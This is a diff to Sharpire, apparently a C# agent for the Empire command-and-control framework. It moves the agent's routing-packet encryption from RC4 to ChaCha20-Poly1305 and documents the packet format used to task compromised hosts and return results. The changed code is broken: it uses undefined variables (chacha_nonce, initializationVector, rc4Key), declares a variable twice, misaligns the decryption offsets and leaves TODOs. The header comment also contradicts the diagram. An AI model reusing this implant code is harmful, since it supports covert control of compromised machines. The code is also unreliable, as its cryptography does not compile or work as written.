@@ -11,6 +11,73 @@ using System.Threading;
 
 namespace Sharpire
 {
+/*
+
+Packet handling functionality for Empire.
+
+Defines packet types, builds tasking packets and parses result packets.
+
+Packet format:
+
+RC4s = RC4 encrypted with the shared staging key
+HMACs = SHA1 HMAC using the shared staging key
+AESc = AES encrypted using the client's session key
+HMACc = first 10 bytes of a SHA256 HMAC using the client's session key
+
+    Routing Packet:
+    +---------+--------------------------------+--------------------------+
+    |  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
+    +---------+--------------------------------+--------------------------+
+    |    12   |                32              |          length          |
+    +---------+--------------------------------+--------------------------+
+
+        ChaCha20+Poly1305(RoutingData):
+        +---------------------------+---------------------------+
+        |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
+        +---------------------------+---------------------------+
+        |           16              |            16             |
+        +---------------------------+---------------------------+
+
+            ChaCha20(RoutingData):
+            +-----------+------+------+-------+--------+
+            | SessionID | Lang | Meta | Extra | Length |
+            +-----------+------+------+-------+--------+
+            |    8      |  1   |  1   |   2   |    4   |
+            +-----------+------+------+-------+--------+
+
+    SessionID = the sessionID that the packet is bound for
+    Lang = indicates the language used
+    Meta = indicates staging req/tasking req/result post/etc.
+    Extra = reserved for future expansion
+
+
+    AESc(client data)
+    +--------+-----------------+-------+
+    | AES IV | Enc Packet Data | HMACc |
+    +--------+-----------------+-------+
+    |   16   |   % 16 bytes    |  10   |
+    +--------+-----------------+-------+
+
+    Client data decrypted:
+    +------+--------+--------------------+----------+---------+-----------+
+    | Type | Length | total # of packets | packet # | task ID | task data |
+    +------+--------+--------------------+--------------------+-----------+
+    |  2   |   4    |         2          |    2     |    2    | <Length>  |
+    +------+--------+--------------------+----------+---------+-----------+
+
+    type = packet type
+    total # of packets = number of total packets in the transmission
+    Packet # = where the packet fits in the transmission
+    Task ID = links the tasking to results for deconflict on server side
+
+
+    Client *_SAVE packets have the sub format:
+
+            [15 chars] - save prefix
+            [5 chars]  - extension
+            [X...]     - tasking data
+
+*/
     class Coms
     {
         public SessionInfo sessionInfo;
@@ -19,7 +86,7 @@ namespace Sharpire
         private int ServerIndex = 0;
 
         private JobTracking jobTracking;
-        
+
         internal Coms(SessionInfo sessionInfo)
         {
             this.sessionInfo = sessionInfo;
@@ -27,6 +94,8 @@ namespace Sharpire
 
         private byte[] NewRoutingPacket(byte[] encryptedBytes, int meta)
         {
+            int nonce_length = 12;
+            int chacha_header_length = nonce_length + 32;
             int encryptedBytesLength = 0;
             if (encryptedBytes != null && encryptedBytes.Length > 0)
             {
@@ -37,12 +106,15 @@ namespace Sharpire
             byte lang = 0x03;
             data = Misc.combine(data, new byte[4] { lang, Convert.ToByte(meta), 0x00, 0x00 });
             data = Misc.combine(data, BitConverter.GetBytes(encryptedBytesLength));
+            byte[] routingPacketData = EmpireStager.rc4Encrypt(rc4Key, data); //TODO
+            byte[] chacha_data = new byte[16];
+            byte[] poly1305_tag = new byte[16];
+            using (var chacha = new ChaCha20Poly1305(sessionInfo.GetStagingKeyBytes()))
+            {
+                chacha.Encrypt(chacha_nonce, data, chacha_data, poly1305_tag, associatedData: null);
+            }
 
-            byte[] initializationVector = NewInitializationVector(4);
-            byte[] rc4Key = Misc.combine(initializationVector, sessionInfo.GetStagingKeyBytes());
-            byte[] routingPacketData = EmpireStager.rc4Encrypt(rc4Key, data);
-
-            routingPacketData = Misc.combine(initializationVector, routingPacketData);
+            byte[] routingPacketData = Misc.combine(initializationVector, routingPacketData, poly1305_tag); //TODO
             if (encryptedBytes != null && encryptedBytes.Length > 0)
             {
                 routingPacketData = Misc.combine(routingPacketData, encryptedBytes);
@@ -55,21 +127,29 @@ namespace Sharpire
         {
             this.jobTracking = jobTracking;
 
-            if (packetData.Length < 20)
+            int nonce_length = 12;
+            int chacha_header_length = nonce_length + 32;
+            if (packetData.Length < chacha_header_length)
             {
                 return;
             }
             int offset = 0;
             while (offset < packetData.Length)
             {
-                byte[] routingPacket = packetData.Skip(offset).Take(20).ToArray();
-                byte[] routingInitializationVector = routingPacket.Take(4).ToArray();
-                byte[] routingEncryptedData = packetData.Skip(4).Take(16).ToArray();
-                offset += 20;
+                byte[] routingPacket = packetData.Skip(offset).Take(chacha_header_length).ToArray();
+                byte[] routingInitializationVector = routingPacket.Take(nonce_length).ToArray();
+                byte[] routingEncryptedData = packetData.Skip(nonce_length).Take(32).ToArray();
+                offset += chacha_header_length;
 
-                byte[] rc4Key = Misc.combine(routingInitializationVector, sessionInfo.GetStagingKeyBytes());
+                byte[] actual_data = routingPacket.Take(16).ToArray();
+                byte[] tag = routingPacket.Skip(16).Take(16).ToArray();
 
-                byte[] routingData = EmpireStager.rc4Encrypt(rc4Key, routingEncryptedData);
+                byte[] routingData = new byte[16];
+                // Strip tag + decrypt
+                using (var chacha = new ChaCha20Poly1305(sessionInfo.GetStagingKeyBytes()))
+                {
+                    chacha.Decrypt(routingInitializationVector, actual_data, tag, routingData, associatedData: null);
+                }
                 string packetSessionId = Encoding.UTF8.GetString(routingData.Take(8).ToArray());
                 try
                 {
@@ -271,7 +351,7 @@ namespace Sharpire
             string tableString = table.ToString();
             return EncodePacket(packet.type, tableString, packet.taskId);
         }
-        
+
         internal byte[] EncodePacket(ushort type, string data, ushort resultId)
         {
             data = Convert.ToBase64String(Encoding.UTF8.GetBytes(data));
@@ -289,7 +369,7 @@ namespace Sharpire
 
             return packet;
         }
-        
+
         [StructLayout(LayoutKind.Sequential, Pack = 1)]
         public struct PACKET
         {
@@ -302,7 +382,7 @@ namespace Sharpire
             public string data;
             public string remaining;
         };
-        
+
         private PACKET DecodePacket(byte[] packet, int offset)
         {
             PACKET packetStruct = new PACKET();
@@ -318,7 +398,7 @@ namespace Sharpire
             packet = null;
             return packetStruct;
         }
-        
+
         internal static byte[] NewInitializationVector(int length)
         {
             Random random = new Random();
@@ -329,7 +409,7 @@ namespace Sharpire
             }
             return initializationVector;
         }
-        
+
         public byte[] Task41(PACKET packet)
         {
             try
@@ -364,7 +444,7 @@ namespace Sharpire
                 return EncodePacket(0, $"[!] Error: {ex.Message}", packet.taskId);
             }
         }
-        
+
         private string ParsePath(string[] parts, out bool isChunkSizeAdjusted)
         {
             isChunkSizeAdjusted = false;
@@ -415,7 +495,7 @@ namespace Sharpire
 
             } while (true);
         }
-        
+
         private byte[] Task42(PACKET packet)
         {
             string[] parts = packet.data.Split('|');
@@ -430,7 +510,7 @@ namespace Sharpire
             {
                 content = Convert.FromBase64String(base64Part);
             }
-            catch(FormatException ex)
+            catch (FormatException ex)
             {
                 return EncodePacket(packet.type, "[!] Upload failed: " + ex.Message, packet.taskId);
             }
@@ -521,7 +601,7 @@ namespace Sharpire
             }
             return EncodePacket(packet.type, sb.ToString(), packet.taskId);
         }
-        
+
         public Byte[] Task122(PACKET packet)
         {
             const int delay = 1;
